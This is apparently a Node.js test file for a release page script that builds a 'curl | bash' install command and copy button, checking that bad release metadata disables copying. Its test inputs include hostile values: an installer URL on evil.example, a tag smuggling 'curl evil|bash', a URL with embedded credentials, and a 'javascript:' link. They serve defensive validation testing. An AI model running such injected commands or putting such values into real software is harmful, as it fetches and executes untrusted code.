const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { test } = require('node:test');

const script = fs.readFileSync(path.join(__dirname, '../web/kb/release.js'), 'utf8');
const base = 'https://code.alipay.com/pd.pt/dogpdkb/releases';
const stable = {
  schema_version: 1, version: '0.1.1', tag: 'v0.1.1', channel: 'stable',
  installer_url: `${base}/download/v0.1.1/install.sh`, release_url: base,
};
async function load(data = stable, options = {}) {
  const elements = new Map();
  const listeners = new Map();
  let request;
  let selected = false;
  let copied;
  const document = {
    getElementById(id) {
      if (!elements.has(id)) elements.set(id, {
        value: '', disabled: true, style: {}, scrollHeight: 80,
        classList: { toggle() {} },
        addEventListener(event, callback) { listeners.set(`${id}:${event}`, callback); },
        focus() {}, select() { selected = true; }, setSelectionRange() {},
      });
      return elements.get(id);
    },
    execCommand(name) { assert.equal(name, 'copy'); return options.copyWorks !== false; },
  };
  const window = { isSecureContext: options.secure === true, addEventListener() {} };
  const navigator = { clipboard: { async writeText(value) {
    if (options.denyClipboard) throw new Error('Denied');
    copied = value;
  } } };
  vm.runInNewContext(script, {
    document, window, navigator, AbortController, setTimeout, clearTimeout,
    fetch: async (url, settings) => {
      request = { url, settings };
      return { ok: options.ok !== false, json: async () => data };
    },
  });
  await new Promise(resolve => setImmediate(resolve));
  return { elements, request, click: () => listeners.get('copy-install:click')(),
    selected: () => selected, copied: () => copied };
}

test('stable install command is exact and metadata bypasses browser cache', async () => {
  const page = await load();
  assert.equal(page.request.url, 'release.json');
  assert.equal(page.request.settings.cache, 'no-store');
  assert.equal(page.elements.get('install-command').value, `curl -fsSL ${stable.installer_url} | bash`);
  assert.equal(page.elements.get('release-version').textContent, '稳定版 v0.1.1');
  assert.equal(page.elements.get('copy-install').disabled, false);
});

test('preview is explicitly distinguished from a stable release', async () => {
  const tag = 'installer-uat-20261106T060938Z';
  const page = await load({ ...stable, channel: 'preview', tag, installer_url: `${base}/download/${tag}/install.sh` });
  assert.equal(page.elements.get('release-version').textContent, '预览版 v0.1.1');
  assert.match(page.elements.get('install-status').textContent, /非正式稳定版/);
});

for (const [name, override] of Object.entries({
  origin: { installer_url: 'https://evil.example/install.sh' },
  injection: { tag: 'v0.1.1;curl evil|bash' },
  mismatch: { version: '0.2.0' },
  credentials: { installer_url: 'https://u:p@code.alipay.com/pd.pt/dogpdkb/releases/download/v0.1.1/install.sh' },
  releaseLink: { release_url: 'javascript:alert(1)' },
  schema: { schema_version: 2 },
  array: { version: ['0.1.1'] },
})) {
  test(`invalid ${name} metadata disables copying and exposes no command`, async () => {
    const page = await load({ ...stable, ...override });
    assert.equal(page.elements.get('copy-install').disabled, true);
    assert.equal(page.elements.get('install-command').value, '');
  });
}

test('missing release disables only install UI', async () => {
  const page = await load(null, { ok: false });
  assert.equal(page.elements.get('copy-install').disabled, true);
  assert.match(page.elements.get('install-status').textContent, /已停用复制/);
});

test('HTTP clipboard fallback selects and copies command', async () => {
  const page = await load();
  await page.click();
  assert.equal(page.selected(), true);
  assert.equal(page.elements.get('copy-install').textContent, '已复制 ✓');
});

test('clipboard denial falls back to manual selection without false success', async () => {
  const page = await load(stable, { secure: true, denyClipboard: true, copyWorks: false });
  await page.click();
  assert.equal(page.selected(), true);
  assert.match(page.elements.get('install-status').textContent, /Ctrl\+C/);
  assert.notEqual(page.elements.get('copy-install').textContent, '已复制 ✓');
});

test('secure clipboard receives exactly the displayed command', async () => {
  const page = await load(stable, { secure: true });
  await page.click();
  assert.equal(page.copied(), page.elements.get('install-command').value);
});
